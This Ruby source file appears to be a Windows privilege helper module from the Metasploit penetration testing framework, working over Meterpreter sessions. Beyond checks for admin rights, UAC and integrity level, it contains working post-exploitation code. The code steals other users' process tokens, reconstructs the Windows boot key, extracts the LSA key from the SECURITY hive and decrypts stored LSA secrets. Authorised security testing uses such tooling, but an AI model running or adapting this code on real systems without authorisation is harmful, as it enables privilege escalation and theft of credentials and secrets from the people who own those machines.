# -*- coding: binary -*-

require 'msf/core/post/windows/accounts'
require 'msf/core/post/windows/registry'

module Msf::Post::Windows::Priv
  include ::Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry

  INTEGRITY_LEVEL_SID = {
      :low => 'S-1-16-4096',
      :medium => 'S-1-16-8192',
      :high => 'S-1-16-12288',
      :system => 'S-1-16-16384'
  }

  SYSTEM_SID = 'S-1-5-18'
  ADMINISTRATORS_SID = 'S-1-5-32-544'

  # http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
  # ConsentPromptBehaviorAdmin
  UAC_NO_PROMPT = 0
  UAC_PROMPT_CREDS_IF_SECURE_DESKTOP = 1
  UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP = 2
  UAC_PROMPT_CREDS = 3
  UAC_PROMPT_CONSENT = 4
  UAC_DEFAULT = 5

  #
  # Returns true if user is admin and false if not.
  #
  def is_admin?
    if session_has_ext
      # Assume true if the OS doesn't expose this (Windows 2000)
      session.railgun.shell32.IsUserAnAdmin()["return"] rescue true
    else
      local_service_key = registry_enumkeys('HKU\S-1-5-19')
      if local_service_key
        return true
      else
        return false
      end
    end
  end

  # Steals the current user's token.
  # @see steal_token
  def steal_current_user_token
    steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
  end

  #
  # Steals a token for a user.
  # @param String computer_name Computer name.
  # @param String user_name To token to steal from. If not set, it will try to steal
  #                        the current user's token.
  # @return [boolean] TrueClass if successful, otherwise FalseClass.
  # @example steal_token(get_env('COMPUTERNAME'), get_env('USERNAME'))
  #
  def steal_token(computer_name, user_name)
    pid = nil

    session.sys.process.processes.each do |p|
      if p['user'] == "#{computer_name}\\#{user_name}"
        pid = p['pid']
      end
    end

    unless pid
      vprint_error("No PID found for #{user_name}")
      return false
    end

    vprint_status("Stealing token from PID #{pid} for #{user_name}")

    begin
      session.sys.config.steal_token(pid)
    rescue Rex::Post::Meterpreter::RequestError => e
      # It could raise an exception even when the token is successfully stolen,
      # so we will just log the exception and move on.
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    end

    true
  end


  #
  # Returns true if in the administrator group
  #
  def is_in_admin_group?
    whoami = get_whoami

    if whoami.nil?
      print_error("Unable to identify admin group membership")
      return nil
    elsif whoami.include? ADMINISTRATORS_SID
      return true
    else
      return false
    end
  end

  #
  # Returns true if running as Local System
  #
  def is_system?
    if session_has_ext
      return session.sys.config.is_system?
    else
      results = registry_enumkeys('HKLM\SAM\SAM')
      if results
        return true
      else
        return false
      end
    end
  end

  #
  # Returns true if UAC is enabled
  #
  # Returns false if the session is running as system, if uac is disabled or
  # if running on a system that does not have UAC
  #
  def is_uac_enabled?
    uac = false
    winversion = session.sys.config.sysinfo['OS']

    if winversion =~ /Windows (Vista|7|8|2008|2012|10|2016|2019)/
      unless is_system?
        begin
          enable_lua = registry_getvaldata(
              'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
              'EnableLUA'
          )
          uac = (enable_lua == 1)
        rescue Rex::Post::Meterpreter::RequestError => e
          print_error("Error Checking if UAC is Enabled: #{e.class} #{e}")
        end
      end
    end
    return uac
  end

  #
  # Returns the UAC Level
  #
  # @see http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
  # 2 - Always Notify, 5 - Default, 0 - Disabled
  #
  def get_uac_level
    begin
      uac_level = registry_getvaldata(
          'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
          'ConsentPromptBehaviorAdmin'
      )
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Error Checking UAC Level: #{e.class} #{e}")
    end

    if uac_level
      return uac_level
    else
      return nil
    end
  end

  #
  # Returns the Integrity Level
  #
  def get_integrity_level
    whoami = get_whoami

    if whoami.nil?
      print_error("Unable to identify integrity level")
      return nil
    else
      INTEGRITY_LEVEL_SID.each_pair do |k,sid|
        if whoami.include? sid
          return sid
        end
      end
    end
  end

  #
  # Returns true if in a high integrity, or system, service
  #
  def is_high_integrity?
    il = get_integrity_level
    (il == INTEGRITY_LEVEL_SID[:high] || il == INTEGRITY_LEVEL_SID[:system])
  end

  #
  # Returns the output of whoami /groups
  #
  # Returns nil if Windows whoami is not available
  #
  def get_whoami
    whoami = cmd_exec('cmd.exe /c whoami /groups')

    if whoami.nil? or whoami.empty?
      return nil
    elsif whoami =~ /is not recognized/ or whoami =~ /extra operand/ or whoami =~ /Access is denied/
      return nil
    else
      return whoami
    end
  end

  #
  # Return true if the session has extended capabilities (ie meterpreter)
  #
  def session_has_ext
    begin
      return !!(session.railgun and session.sys.config)
    rescue NoMethodError
      return false
    end
  end

  #
  # Returns the unscrambled bootkey
  #
  def capture_boot_key
    bootkey = ""
    basekey = "System\\CurrentControlSet\\Control\\Lsa"

    %W{JD Skew1 GBG Data}.each do |k|
      begin
        ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, basekey + "\\" + k, KEY_READ)
      rescue Rex::Post::Meterpreter::RequestError
      end

      return nil if not ok
      bootkey << [ok.query_class.to_i(16)].pack("V")
      ok.close
    end

    keybytes = bootkey.unpack("C*")
    descrambled = ""
    descrambler = [ 0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04 ]

    0.upto(keybytes.length-1) do |x|
      descrambled << [keybytes[descrambler[x]]].pack("C")
    end

    return descrambled
  end

  #
  # Converts DES 56 to DES 64
  #
  def convert_des_56_to_64(kstr)
    des_odd_parity = [
      1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
      16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
      32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
      49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
      64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
      81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
      97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
      112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
      128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
      145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
      161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
      176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
      193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
      208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
      224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
      241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
    ]

    key = []
    str = kstr.unpack("C*")

    key[0] = str[0] >> 1
    key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
    key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
    key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
    key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
    key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
    key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
    key[7] = str[6] & 0x7F

    0.upto(7) do |i|
      key[i] = ( key[i] << 1)
      key[i] = des_odd_parity[key[i]]
    end
    return key.pack("C*")
  end

  #
  # Returns the LSA key upon input of the unscrambled bootkey
  #
  # @note This requires the session be running as SYSTEM
  #
  def capture_lsa_key(bootkey)
    vprint_status("Getting PolSecretEncryptionKey...")
    pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolSecretEncryptionKey", "")
    if pol
      print_status("XP or below system")
      @lsa_vista_style = false
      md5x = Digest::MD5.new()
      md5x << bootkey
      (1..1000).each do
        md5x << pol[60,16]
      end

      rc4 = OpenSSL::Cipher.new("rc4")
      rc4.key = md5x.digest
      lsa_key  = rc4.update(pol[12,48])
      lsa_key << rc4.final
      lsa_key = lsa_key[0x10..0x1F]
    else
      print_status("Vista or above system")
      @lsa_vista_style = true

      vprint_status("Trying 'V72' style...")
      vprint_status("Getting PolEKList...")
      pol = registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", "")

      # If that didn't work, then we're out of luck
      return nil if pol.nil?

      lsa_key = decrypt_lsa_data(pol, bootkey)
      lsa_key = lsa_key[68,32]
    end

    vprint_good(lsa_key.unpack("H*")[0])
    return lsa_key
  end

  # Whether this system has Vista-style secret keys
  #
  # @return [Boolean] True if this session has keys in the PolEKList
  #   registry key, false otherwise.
  def lsa_vista_style?
    if @lsa_vista_style.nil?
      @lsa_vista_style = !!(registry_getvaldata("HKLM\\SECURITY\\Policy\\PolEKList", ""))
    end

    @lsa_vista_style
  end

  # Decrypts LSA encrypted data
  #
  # @param policy_secret [String] The encrypted data stored in the
  #   registry.
  # @param lsa_key [String] The key as returned by {#capture_lsa_key}
  # @return [String] The decrypted data
  def decrypt_lsa_data(policy_secret, lsa_key)

    sha256x = Digest::SHA256.new()
    sha256x << lsa_key
    1000.times do
      sha256x << policy_secret[28,32]
    end

    aes = OpenSSL::Cipher.new("aes-256-cbc")
    aes.key = sha256x.digest

    vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")

    decrypted_data = ''

    (60...policy_secret.length).step(16) do |i|
      aes.decrypt
      aes.padding = 0
      decrypted_data << aes.update(policy_secret[i,16])
    end

    return decrypted_data
  end

  # Decrypts "Secret" encrypted data
  #
  # Ruby implementation of SystemFunction005. The original python code
  # has been taken from Credump
  #
  # @param secret [String]
  # @param key [String]
  # @return [String] The decrypted data
  def decrypt_secret_data(secret, key)

    j = 0
    decrypted_data = ''

    for i in (0...secret.length).step(8)
      enc_block = secret[i..i+7]
      block_key = key[j..j+6]
      des_key = convert_des_56_to_64(block_key)
      d1 = OpenSSL::Cipher.new('des-ecb')

      d1.padding = 0
      d1.key = des_key
      d1o = d1.update(enc_block)
      d1o << d1.final
      decrypted_data += d1o
      j += 7
      if (key[j..j+7].length < 7 )
        j = key[j..j+7].length
      end
    end
    dec_data_len = decrypted_data[0].ord

    return decrypted_data[8..8+dec_data_len]

  end

end
